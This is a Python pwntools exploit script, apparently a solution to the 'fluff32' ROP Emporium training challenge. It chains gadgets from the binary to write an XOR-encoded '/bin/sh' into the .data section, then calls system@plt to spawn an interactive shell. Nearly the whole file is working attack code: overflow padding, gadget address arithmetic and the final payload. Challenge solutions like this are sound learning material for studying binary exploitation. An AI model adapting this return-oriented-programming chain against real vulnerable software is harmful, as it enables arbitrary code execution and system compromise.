from pwn import *
import pdb


def padString(inputString, width):
    if len(inputString) % width == 0:
	inputString += "\x00" * width
    else:
	inputString += (width-(len(inputString)%width)) * "\x00"
    return inputString


def encodeString(inputString, xorByte, width):
    inputString = padString(inputString,width)

    inputStringBytes = bytearray(inputString)

    encodedString = ""

    for i in range(0,len(inputStringBytes),width):
	xorVal = inputStringBytes[i] ^ xorByte # we encode only the first byte of the string with XOR
	encodedString += chr(xorVal)
        encodedString += inputString[i+1:i+width]

    return encodedString


def writeStringToLocation(inputString, location,width):

 ropchain = ""

 inputString_encoded = encodeString(inputString,0xFF,width)
 for i in range(0,len(inputString_encoded),width):

 # Step 1: Move destination address in ecx
     ropchain += p32(pop_ebx)
     ropchain += p32(data_section + i)
 #ebx now contains our data section

     ropchain += p32(zero_edx)
     ropchain += "B"*width # junk to pop into esi
     ropchain += p32(copy_edx_ebx)
     ropchain += "B"*width # junk to pop into ebp
 #edx contains now our data section

     ropchain += p32(xchg_ecx_edx)
     ropchain += "B"*width # junk to pop into ebp

 # Step 2: Move encoded string into edx

     ropchain += p32(pop_ebx)
     ropchain += inputString_encoded[i:i+width]
 #ebx now contains our encoded string

     ropchain += p32(zero_edx)
     ropchain += "B"*width # junk to pop into esi
     ropchain += p32(copy_edx_ebx)
     ropchain += "B"*width # junk to pop into ebp
 #edx contains now our encoded

 # Step 3: move the encoded string to our target location and decode it

     ropchain += p32(mov_ecxptr_edx)
     ropchain += "B" * width # junk to pop into ebp
     ropchain += "\xFF" * width  # 0xFFFFFFFF to pop into ebx, which will be used for decoding the first of four bytes

 return ropchain







e = ELF("./fluff32")
cmd_string = "/bin/sh"

crap = "A" * 44

gadgets_base = e.symbols["questionableGadgets"]

pop_ebx = e.symbols["_init"] + 33  # pop ebx; ret
zero_edx = gadgets_base + 1  # xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
copy_edx_ebx = gadgets_base + 11  # xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
xchg_ecx_edx = gadgets_base + 25  # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
mov_ecxptr_edx = gadgets_base + 35 # mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
data_section = e.get_section_by_name(".data").header.sh_addr
system_plt = e.symbols["plt.system"] # system@plt


ropchain = writeStringToLocation(cmd_string,data_section,4)

# Step 4: Call system@plt


payload = crap

payload += ropchain

payload += p32(system_plt)
payload += "B" * 4 # crippled RET address

payload += p32(data_section)






io = e.process()

io.sendline(payload)

io.interactive()
